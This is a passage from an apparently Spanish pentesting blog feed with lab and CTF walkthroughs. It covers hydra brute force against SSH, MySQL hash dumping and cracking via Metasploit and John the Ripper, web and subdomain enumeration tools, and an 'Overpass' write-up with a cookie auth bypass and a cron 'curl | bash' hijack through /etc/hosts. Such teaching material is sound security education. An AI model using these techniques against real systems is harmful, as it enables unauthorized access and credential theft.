+  <pre><code>
+hydra -t 16 -l <username> -P <ruta_diccionario> -vV <ip-servidor> [protocolo]
+  &lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+<ul>  
+  <li><code>-t 16</code>: número de conexiones paralelas por objetivo, en este caso 16.</li>
+  <li><code>-l username</code>: Nombre de usuario a atacar.</li>
+  <li><code>-P ruta_diccionario</code>: Ruta del diccionario, por ejemplo /usr/share/wordlists/rockyou.txt.</li>
+  <li><code>-vV</code>: Pone el verbose a *very verbose* mostrando login+pass cada vez que realiza un intento.</li>
+  <li><code>ip-servidor</code>: Indica la dirección IP del servidor.</li>
+  <li><code>[protocolo]</code>: Añade el protocolo, por ejemplo ssh.</li>
+</ul>
+### Ejemplo práctico:
+
+1. Realizamos un escaneo de los puertos de la red para ver cuales están abiertos y que servicios están corriendo:
+
+<div style="text-align:left;">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align:center; ">
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 12.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+      <td>
+      <div style="text-align:center; ">
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 13.png" alt="Untitled" onclick="openModal(this.src)" style="width:75%" />
+      </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+2. No encontramos nada, pero sabemos que podemos hacer uso de metasploit, con `msfconsole` activamos la herramienta y vamos a buscar exploits sobre “mstp_version”:
+
+<div style="text-align:left;">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:650px">
+        <div style="text-align:center;">
+        2.1 Mediante <code>search nombre_modulo</code> realizamos una búsqueda de los exploits:
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 14.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+        </div>
+      </td>
+      <td style="vertical-align:top;">
+      <div style="text-align:center; ">
+      2.2 Mediante <code>options modulo</code> podemos listar las opciones que tiene el exploit:
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 15.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Vamos a especificar el host, en este caso será la ip de la maquina victima, lo hacemos mediante el comando <code>set [opcion] valor</code>, en nuestro caso → <code>set RHOSTS ip-maquina</code>.</p>
+
+<div style="text-align:center;">2.3 Ahora, lo ejecutamos con <code>run</code>:</div>
+<div style="text-align:center; vertical-align:top;">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 16.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+Vemos que el MTA de *polosmtp.home* es Postfix.
+
+3. Ahora, con metasploit podemos enumerar los usuarios del servicio smtp → `search smtp_enum`
+
+<div style="text-align:left;">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:650px">
+        <div style="text-align:center; ">
+        3.1 Vemos las opciones que tiene el exploit:
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 17.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+        </div>
+      </td>
+      <td style="vertical-align:top;">
+      <div style="text-align:center; ">
+        3.2 Añadimos las opciones necesarias para que se pueda ejecutar:
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 18.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+      Ahora tenemos que especificar tanto el <code>RHOST</code> (igual que antes) como <code>USER_FILE</code> (diccionario con usernames).<br />
+      Si no tienes el diccionario instalado, haz → <code>sudo apt install seclists -y</code>.<br />Añadimos el diccionario y ejecutamos.<br />
+      Hemos encontrado a los usuarios, en este caso solamente existe el administrador.
+      </td>
+    </tr>
+  </table>
+</div>
+
+4. Ahora, si vemos el escaneo de puertos, vemos que hay un servicio ssh corriendo, por tanto, vamos a realizar una ataque de fuerza bruta para conseguir la contraseña del usuario <em>administrator</em>:
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 19.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<table>
+  <tr>
+    <td style="vertical-align:top; width:600px">
+      <div style="text-align:center; ">
+      5. Conseguimos la contraseña y realizamos la conexión ssh con las credenciales:
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 20.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+    </td>
+    <td style="width:550px; text-align:center;">
+      <div style="text-align:center;">
+      6. Dentro del servidor buscamos la flag:
+        <img src="../assets/images/Labs/ServiciosRedII/Untitled 21.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%;max-width:500px" />
+      </div>
+    </td>
+  </tr>
+</table>
+
+# Gestión de bases de datos relacionales MySQL
+
+*MySQL* es un gestor de bases de datos relacionales (RDBMS), basado en un Lenguaje Estructurado mediante Consultas (Structured Query Language) ampliamente utilizado para almacenar, gestionar y recuperar datos en aplicaciones web y sistemas empresariales. 
+
+Un uso muy común de MySQL sería la de una base de datos para back end.
+
+Hace uso del puerto `TCP 3306`.
+
+## Como funciona MySQL
+
+El servidor SQL puede realizar consultas a la base de datos, modificarla, crear nuevas o eliminar bases de datos ya existente.
+
+Aquí podemos encontrar más información sobre [SQL](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html)
+
+## Como enumerar MySQL
+
+1. <strong>Uso de la herramienta Nmap:</strong>
+    
+<div style="text-align:center;">
+  <pre><code>
+nmap -p 3306 --script=mysql-info <target>
+  &lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+Este comando escanea el puerto 3306 (puerto predeterminado para MySQL) e intenta identificar información sobre el servicio MySQL.    
+
+## Como explotar MySQL
+
+1. <strong>Realizar una inyección SQL (SQLi):</strong>
+    
+    Podemos buscar puntos de entrada donde se ingresan datos que se utilizan directamente en consultas SQL. Por ejemplo, formularios web, parámetros de URL, etc.
+    
+    Podemos ver más información sobre este tipo de ataque en → [Introducción a las SQL injection](https://joseeelv.github.io//blog/IntroSQLi).
+    
+2. <strong>Explotación de Configuración Incorrecta:</strong>
+    
+    Podemos comprobar si el servidor MySQL está configurado sin una contraseña para el usuario root:
+    
+<div style="text-align:center;">
+  <pre><code>
+mysql -u root
+  </code></pre>
+</div> 
+    También podemos comprobar si un usuario tiene privilegios elevados sin necesidad, si este puede realizar consultas privilegiadas:
+    
+<div style="text-align:center;">
+  <pre><code>
+GRANT ALL PRIVILEGES ON *.* TO 'usuario'@'localhost' WITH GRANT OPTION;
+  </code></pre>
+</div>
+
+3. <strong>Explotación de Vulnerabilidades Conocidas</strong>
+    
+    Podemos hacer uso de vulnerabilidades conocidas <strong>CVEs</strong> si el servidor no ha sido actualizado.
+    También algunos plugins de MySQL pueden contener vulnerabilidades que pueden ser explotadas si el servidor MySQL está mal configurado.
+    
+### Ejemplo práctico:
+
+1. Realizamos un escaneo de la red:<br />
+<div style="text-align:center;">
+  <pre>sudo nmap -p- -sS -sV -sC -n -Pn -vvv --min-rate 5000 ip_maquina</pre>
+</div>
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 23.png" alt="Untitled" onclick="openModal(this.src)" style="width:50%" />
+</div><br />
+Vemos que en el puerto 3306 tenemos un servicio corriendo, para poder explotarlo podemos hacer uso de metasploit.
+
+2. Hacemos uso de `Mestasploit framework`:
+
+<div style="text-align:left;">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:650px">
+        <div style="text-align:center; ">
+        2.1 Buscamos el exploit:
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 24.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+        2.3 Ponemos las opciones que nos faltan para que el exploit funcione:
+        <ul>
+          <li> <code>set userane root</code></li>
+          <li> <code>set password password</code></li>
+          <li> <code>set rhosts ip-victima</code></li>
+        </ul>
+      </td>
+      <td style="vertical-align:top;">
+        <div style="text-align:center; ">
+        2.2 Vemos las opciones que faltan:
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 25.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+3. Ejecutamos el exploit con `run` y obtenemos la versión de la base de datos:
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 26.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+4. Ahora, vamos a mostrar las bases de datos → `set sql "show databases"` 
+
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 27.png" alt="Untitled" onclick="openModal(this.src)" />
+  
+  Encontramos 4 bases de datos.
+</div>
+
+
+5. Ahora que tenemos enumerado el servicio SQL, vamos a explotarlo:<br />
+<div style="text-align:left;">
+  <table>
+    <tr>
+      <td style="vertical-align:top; width:650px">
+        <div style="text-align:center; ">
+          5.1 Para ello, vamos a dumpear las bases de datos con el módulo → <code>/mysql/msql_schemadump</code>
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 28.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+        Especificamos las opciones para poder correr el exploit (como arriba) y lo ejecutamos y nos muestra todas las tablas que hay en la base de datos.
+      </td>
+      <td style="vertical-align:top;">
+        <div style="text-align:center; ">
+        5.2 Ejecutamos el exploit:
+          <img src="../assets/images/Labs/ServiciosRedII/Untitled 29.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+Como resultado tenemos los creadores de las bases de datos junto con sus password, pero esta está cifrada con hash:
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 30.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+6. Vemos que hay un usuario ‘*carl*’,que no es un usuario por defecto, y tenemos su password hasheada, por tanto la vamos a guardar en un fichero para descifrarla.<br />
+Para ello, copiamos el hash en nuestra máquina y mediante `JohnTheRipper` y un diccionario la vamos a descrifrar:
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 31.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+
+- <strong>Password descifrada con JohnTheRipper</strong> → doggie
+    
+
+7. Ahora vamos a acceder a la base de datos vía **SSH** con las credenciales del usuario *carl* ya que tenemos un servicio corriendo:<br />
+Finalmente, buscando entre los directorios encontramos la flag.
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/ServiciosRedII/Untitled 32.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+---
+</target></code></pre></div></ip-servidor></ruta_diccionario></username></code></pre></div></ip-servidor></code></pre></div></ip-servidor></code></pre></div>]]></content><author><name></name></author><category term="LAB" /><summary type="html"><![CDATA[El laboratorio tiene como objetivo enseñar la enumeración y explotación de tres protocolos de red; NFS (Network File System), SMTP (Simple Mail Transfer Protocol) y MySQL. Los participantes aprenderán a identificar vulnerabilidades y realizar ataques utilizando herramientas comunes en pruebas de penetración y administración de sistemas.]]></summary></entry><entry><title type="html">Descubrimiento de Contenidos Web</title><link href="http://localhost:4000/blog/Descubrimientodecontenidos" rel="alternate" type="text/html" title="Descubrimiento de Contenidos Web" /><published>2024-08-08T00:00:00+02:00</published><updated>2024-08-08T00:00:00+02:00</updated><id>http://localhost:4000/blog/Descubrimientodecontenidos</id><content type="html" xml:base="http://localhost:4000/blog/Descubrimientodecontenidos"><![CDATA[<p>Para un pentester el contenido que se puede descubrir son cosas que no se presentan de inmediato y que no siempre fueron destinadas al acceso público.</p>
+
+<p>Este contenido puede ser: versiones anteriores de la página web, archivos de backup (copias de seguridad), archivos de configuración, etc.</p>
+
+<p>Existen tres formas para poder descubrir contenido en un sitio web:</p>
+
+<h1 id="descubrimiento-manual">Descubrimiento manual</h1>
+
+<h2 id="robotstxt">Robots.txt</h2>
+
+<p>El archivo <em>Robots.txt</em> es un documento de texto que le dice a los motores de búsqueda qué páginas pueden y no pueden mostrar en los resultados de su motor de búsqueda o prohíben determinados motores de búsqueda que rastreen el sitio web por completo.</p>
+
+<p>Este archivo nos puede dar una gran lista de ubicaciones en el sitio web que los propietarios no quieren que descubramos como pentester.</p>
+
+<p>Para acceder a él —&gt; <em>https://nombre_pagina_web/robots.txt</em></p>
+
+<h2 id="favicon">Favicon</h2>
+
+<p>Favicon es una pequeño icono que muestra la barra de direcciones del navegador o en la pestaña utilizada para marcar un sitio web.</p>
+
+<p>En el caso de Google sería:</p>
+<div style="text-align:center; ">
+  <img src="../assets/images/Labs/DC/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:300px" />
+</div>
+
+<p>Al construir una página web, si el desarrollador no reemplaza este icono por uno personalizado, en este caso el de Google, podemos saber que framework se está utilizando.</p>
+
+<p>OWASP contiene una base de datos con todos los iconos usados:
+<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">Favicon-DB</a></p>
+
+<p>Si un sitio web no usa un icono personalizado, en el código fuente de la página web podemos encontrar como se llama el favicon, pudiendo así descargarlo y obtener el MD5 hash y cotejarlo con la base de datos de OWASP.</p>
+
+<p>Ejemplo en consola de Linux —&gt; <code class="language-plaintext highlighter-rouge">curl [https://pagina_web/nombre_archivo.ico](https://pagina_web/nombre_archivo.ico) | md5sum</code></p>
+
+<h2 id="sitemapxml">Sitemap.xml</h2>
+
+<p>Este archivo ofrecen una lista de todos los archivos que el propietario del sitio web desea que aparezcan en un motor de búsqueda, a diferencia de robots.txt que restringe quien puede verlos.</p>
+
+<p>Accedemos de igual manera que robots.txt —&gt;  <em>https://nombre_pagina_web/sitemap.xml</em></p>
+
+<h2 id="encabezados-http">Encabezados HTTP</h2>
+
+<p>Cuando hacemos peticiones al servidor web, este devuelve varios encabezamos HTTP. En estos encabezados podemos encontrar información sobre el software del servidor web, el lenguaje de programación o scripts en uso.</p>
+
+<p>Con esto podemos buscar vulnerabilidades o versiones vulnerables del software empleado.</p>
+
+<p>Al hacer un <code class="language-plaintext highlighter-rouge">curl direccion_pagina_web -v</code> , donde “-v” habilita el modo detallado y que generará los encabezados.</p>
+
+<h2 id="framework-stack">Framework Stack</h2>
+
+<p>Una vez obtenido el marco del sitio web ( ya sea a través del favicon o buscando pistas en el código fuente del sitio web), podemos localizar el sitio web del marco. De esta manera podemos buscar información sobre el software del marco ó más información sobre el mismo.</p>
+
+<h1 id="osint-open-source-intelligence">OSINT (Open-Source Intelligence)</h1>
+
+<h2 id="google-hacking--dorking">Google Hacking / Dorking</h2>
+
+<p>OSINT son recursos externos de libre acceso que nos ayuda a descubrir información sobre un sitio web.</p>
+
+<p>Google Hacking / Dorking hace uso de funciones avanzadas del motor de búsqueda de Google, permitiendo filtrar contenido personalizado.</p>
+
+<p>Por ejemplo, puedes buscar información en un dominio concreto con <em>site:nombre_dominio criterio_a_buscar</em></p>
+
+<h2 id="wappalyzer">Wappalyzer</h2>
+
+<p>Wappalyzer es una herramienta en línea y una extensión del navegador que ayuda a identificar que tecnologías usa una página web (marcos, procesadores de pago ,etc..).</p>
+
+<h2 id="wayback-machine">Wayback Machine</h2>
+
+<p>Wayback Machine es un archivo histórico de sitios web que se remonta a finales de los años 90. Puedes buscar un nombre de dominio y mostrará todas las veces que se guardó el contenido de la página web.</p>
+
+<h2 id="github">GitHub</h2>
+
+<p>GitHub hace uso del control de versiones de Git para alojar proyectos. 
+Encontramos repositorios públicos o privados donde hay proyectos que contienen código fuente, contraseñas y otro contenido que puede ser sensible para las empresas.</p>
+
+<h2 id="s3-buckets">S3 Buckets</h2>
+
+<p>Es un servicio de almacenamiento proporcionado por Amazon AWS, que permite guardar archivos e incluso contenido estático del sitio web que son accesibles mediante HTTP y HTTPS.</p>
+
+<p>El propietario de los archivos puede establecer permisos de acceso haciendo que los archivos sean públicos, privados e incluso de escritura.</p>
+
+<p>A veces estos permisos se establecen incorrectamente y permiten inadvertidamente el acceso a archivos que no deberían ser públicos.</p>
+
+<p>Los S3 Buckets pueden detectarse de diversas formas ( encontrando URLs en el código fuente de la página web, en repositorios de GitHub o automatizando el proceso ).</p>
+
+<h1 id="descubrimiento-automatizado">Descubrimiento Automatizado</h1>
+
+<p>El descubrimiento automatizado es el proceso de hacer uso de herramientas con el fin de descubrir contenido sin hacerlo de manera manual.</p>
+
+<p>Hacemos uso de las llamadas ‘wordlists’, que son ficheros de texto que contienen una gran cantidad de credenciales. Las wordlist más comunes contienen contraseñas y nombres de usuarios.</p>
+
+<h2 id="herramientas-automatizadas">Herramientas Automatizadas</h2>
+
+<p>Podemos hacer uso de estás herramientas junto con las wordlist para poder descubrir contenido. Hay muchísimas herramientas disponibles pero nos centraremos en estas tres, ya que vienen preinstaladas con el sistema.</p>
+
+<h3 id="ffuf">FFUF</h3>
+
+<p><code class="language-plaintext highlighter-rouge">ffuf -w ruta_de_la_wordlist -u http://ip_maquina/FUZZ</code></p>
+
+<h3 id="dirb">DIRB</h3>
+
+<p><code class="language-plaintext highlighter-rouge">dirb http://ip_maquina/ ruta_de_la_wordlist</code></p>
+
+<h3 id="gobuster">GOBUSTER</h3>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir --url http://ip_maquina/ -w ruta_de_la_wordlist</code></p>
+
+<hr />]]></content><author><name></name></author><category term="LAB" /><summary type="html"><![CDATA[Este laboratorio se centra en la exploración y descubrimiento de contenido oculto o no destinado al acceso público en sitios web, un proceso crucial para pentesters.]]></summary></entry><entry><title type="html">Enumeración de Subdominios</title><link href="http://localhost:4000/blog/Enumeraci%C3%B3ndeSubdominios" rel="alternate" type="text/html" title="Enumeración de Subdominios" /><published>2024-08-07T00:00:00+02:00</published><updated>2024-08-07T00:00:00+02:00</updated><id>http://localhost:4000/blog/Enumeraci%C3%B3ndeSubdominios</id><content type="html" xml:base="http://localhost:4000/blog/Enumeraci%C3%B3ndeSubdominios"><![CDATA[<p>La enumeración de subdominios es el proceso de descubrir los subdominios válidos de un dominio.
+Pero primero vamos a refrescar que es un dominio.</p>
+
+<p>Un dominio es un nombre que identifica a una página web en concreto. Es la ‘traducción’ de la dirección ip de un sitio web a una palabra fácil de recordar.</p>
+
+<p>Por ejemplo la URL <code class="language-plaintext highlighter-rouge">https://www.google.com</code> vemos que contiene el dominio ‘google.com’ (la cual se traduce de la ip de Google 8.8.8.8), cuyo subdominio es ‘ <em>www</em> ‘ y con una extensión ‘.<em>com</em>’.</p>
+
+<p>Para poder obtener estos subdominios encontramos 3 métodos:</p>
+
+<ul>
+  <li>Fuerza bruta</li>
+  <li>OSINT</li>
+  <li>Virtual Host</li>
+</ul>
+
+<h1 id="osint---certificados-ssl-tls">OSINT - Certificados SSL/ TLS</h1>
+
+<p>Cada vez que un ‘<em>Certificate Authority</em>’ (CA) crea un certificado SSL/TLS para un dominio, este se registra en un registro de transparencia pública (CT).Es decir, podemos capturar todos los certificados SSL/TLS de un dominio en concreto.</p>
+
+<p>El propósito de los registros de transparencia de certificados (CT) es impedir que se utilicen certificados maliciosos o creados accidentalmente.</p>
+
+<p>Hay paginas webs que nos ofrecen bases de datos de certificados en las cuales podemos realizar búsquedas que muestran resultados actuales e históricos.</p>
+
+<p><a href="https://crt.sh/">https://crt.sh/</a> y 
+<a href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a></p>
+
+<h1 id="osint---motores-de-búsqueda">OSINT - Motores de Búsqueda</h1>
+
+<p>Los motores de búsqueda junto con Google Dorking, es un método muy potente a la hora de descubrir nuevos subdominios.</p>
+
+<p>Por ejemplo, podemos hacer uso de ‘site’ en el motor de búsqueda de Google para poder buscar solamente con el dominio especificado.</p>
+
+<p><code class="language-plaintext highlighter-rouge">site:filtro -site:www.tudominio.com site:*.tudominio.com</code></p>
+
+<h1 id="enumeración-dns-por-fuerza-bruta">Enumeración DNS por fuerza bruta</h1>
+
+<p>Es un proceso de probar diferentes subdominios en sucesiones muy rápidas, haciendo uso de una wordlist que contiene subdominios.</p>
+
+<p>Hay herramientas potentes para automatizar este proceso:</p>
+
+<h2 id="dnsrecon">Dnsrecon</h2>
+
+<p>Es una herramienta que nos ayuda a automatizar el proceso de enumeración de DNS mediante fuerza bruta.
+Viene preinstalada en el sistema operativo Kali Linux, y se utiliza en la terminal escribiendo dnsrecon.</p>
+
+<div style="text-align:center;">
+  <pre><code>
+dnsrecon -d [dominio.com](http://dominio.com/) -D ruta_de_la_wordlist_subdominios -t std -xml ouput.xml
+</code></pre>
+</div>
+
+<p>Donde encontramos que dnsrecon escanea un dominio (-d dominio.com), usa una wordlist con subdominios (-D ruta_de_la_wordlist_subdominios), especifica el tipo estándar (-t std) y guarda el resultado en un archivo .xml (-xml output.xml).</p>
+
+<h2 id="sublist3r">Sublist3r</h2>
+
+<p>Aquí hacemos uso de hilos y de motores de búsqueda, además no viene preinstalada con Kali.</p>
+
+<p>Ejemplo de búsqueda de subdominios de Kali.org</p>
+
+<div style="text-align:center;">
+  <pre><code>
+sublist3r -d [kali.org](http://kali.org/) -t 3 -e google
+</code></pre>
+</div>
+
+<p>Vemos que hacer una búsqueda de los subdominios del dominio (-d kali.org), usando el motor de búsqueda de Google (-e google) con 3 hilos (-t 3).</p>
+
+<h1 id="hosts-virtuales">Hosts Virtuales</h1>
+
+<p>Algunos subdominios pueden ser no ser públicamente detectables a través de los resultados DNS, por ejemplo, versiones de desarrollo de una aplicación web o portales de administración. Estos registros DNS a veces se pueden almacenar en servidores DNS privados o en el host <code class="language-plaintext highlighter-rouge">etc/hosts</code> en Linux ó en el archivo <code class="language-plaintext highlighter-rouge">c:\windows\system32\drivers\etc\hosts</code> en Windows.</p>
+
+<p>Con la herramienta ffuf podemos automatizar el proceso de monitorización de la respuesta de la petición que un atacante puede hacer a un sitio web, debido a que la cabecera ‘Host’ en una petición web contiene que sitio web está solicitando el cliente.</p>
+
+<p>Esta herramienta la vimos anteriormente en <a href="https://www.notion.so/Descubrimiento-de-contenidos-f2a85e0fdf1d4e8da374a923740d8eb4?pvs=21">Herramientas Automatizadas de Descubrimiento de contenidos</a></p>
+
+<p>Ejemplo de uso de <strong>ffuf</strong>:</p>
+<div style="text-align:center;">
+  <pre><code>
+ffuf -w ruta_de_la_wordlist -H cabecera -u ip_maquina -fs filtro_salida
+</code></pre>
+</div>
+
+<hr />]]></content><author><name></name></author><category term="LAB" /><summary type="html"><![CDATA[En este laboratorio, se exploran varias técnicas y herramientas para descubrir subdominios válidos de un dominio. Se refresca qué es un dominio y cómo los subdominios forman parte de la estructura de una URL.]]></summary></entry><entry><title type="html">Overpass</title><link href="http://localhost:4000/blog/Overpass" rel="alternate" type="text/html" title="Overpass" /><published>2024-08-07T00:00:00+02:00</published><updated>2024-08-07T00:00:00+02:00</updated><id>http://localhost:4000/blog/Overpass</id><content type="html" xml:base="http://localhost:4000/blog/Overpass"><![CDATA[<p>Primero de todo vamos a realizar un escaneo de los puertos para ver que servicios tiene abiertos para aprovecharnos de eso.</p>
+
+<div style="text-align: center; ">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:655px;" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Tenemos dos puertos abiertos → 22 (servicio ssh) y 80 (página web mediante http). Vamos a obtener información sobre ellos, vamos primero con el puerto 80 (la página web).</p>
+
+<div>
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 2.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+      <td>
+      Mediante `gobuster` buscamos directorios ocultos dentro de la web:
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 3.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>En efecto, hay directorios ocultos, por tanto, vamos a acceder a ellos en especial a <code class="language-plaintext highlighter-rouge">/admin</code>, donde encontramos un login.</p>
+
+<p>Si leemos el código fuente de la pagina web encontramos un script js correspondiente al login:</p>
+
+<div style="text-align: center; ">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 4.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 5.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+        </div>
+      </td>
+      <td>
+      <div style="text-align: center; ">
+        <img src="../assets/images/Rooms/Overpass/Untitled 6.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+      </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Vamos a login.js. Esta función es la encargada de obtener el user y la password y llevarla al endpoint para la respuesta de confirmación del login.</p>
+
+<p>Si leemos el script, vemos que la función Cookie.set tiene como parámetros la respuesta de cuando se envían las credenciales al endpoint, si mandamos el comando</p>
+
+<p><code class="language-plaintext highlighter-rouge">Cookies.set("SessionToken", )</code> iniciaremos sesión sin tener que esperar la respuesta del endpoint.</p>
+
+<p>(<em>Es la pista que nos da el reto :OWASP Top 10 Vuln! Do NOT bruteforce).</em></p>
+
+<p><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 Vuln</a> hace referencia comentado a lo anterior.</p>
+
+<p>Es decir, que mediante la modificación de las Cookies podemos acceder al área de administración.
+Para ello vamos:</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 7.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Arriba creamos una cookie nueva, con el nombre <strong>SessionToken</strong> y Path <strong>”/”</strong>.</p>
+<div style="text-align: center; ">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 9.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Y bingo, estamos dentro, y hemos obtenido el nombre de usuario <strong>James **</strong> y una contraseña la cual está encriptada, para ello vamos a descargarla para que con las herramientas de JohnTheRipper (ssh2john y john) podamos descomprimirla.</p>
+
+<p>Contraseña obtenida!!!!</p>
+
+<p>Por temas de conexión, tuve que reiniciar la maquina 😟</p>
+
+<p>Procedemos a realizar el login shh con el usuario james:</p>
+
+<p>Estamos dentro, ahora vamos a ver los directorios que contiene y a navegar entre ellos.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 10.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Ahí tenemos el user.txt, además tenemos otro archivo de texto</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 11.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>De este archivo podemos sacar información como:</p>
+
+<ul>
+  <li>La contraseña no es lo suficientemente fuerte</li>
+  <li>La contraseña se encuentra en un password manager</li>
+  <li>Hay un script automatizado → cron</li>
+</ul>
+
+<p>Sabiendo estas tres cosas vamos a proceder a convertirnos en root</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 12.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Existe un archivo .overpass donde se encuentran unas credenciales.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 13.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>estas están encriptadas asi que vamos a desencriptarlas con el uso de Cyberchef</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 14.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Ahí tenemos algunas credenciales</p>
+
+<p>Ahora vamos a ver la tarea que está automatizada, para ello vamos hasta /etc y hacemos un cat de crontab</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 15.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Donde la tarea automatizada (cada minuto) es <code class="language-plaintext highlighter-rouge">curl overpass.thm/downloads/src/buildscript.sh | bash</code>.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 16.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Si le echamos un ojo al archivo de los hosts, vemos que tenemos permisos de lectura y escritura, por tanto, podemos modificar alguno( en esencia overpass.thm) y poner la ip de nuestra vpn.</p>
+
+<p>Hacemos un <code class="language-plaintext highlighter-rouge">ip a</code>para ver la ip de nuestra maquina.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 17.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Creamos un directorio downloads/src/buildscript.sh:</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 18.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>A continuación creamos un servidor http con el puerto 80.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 19.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
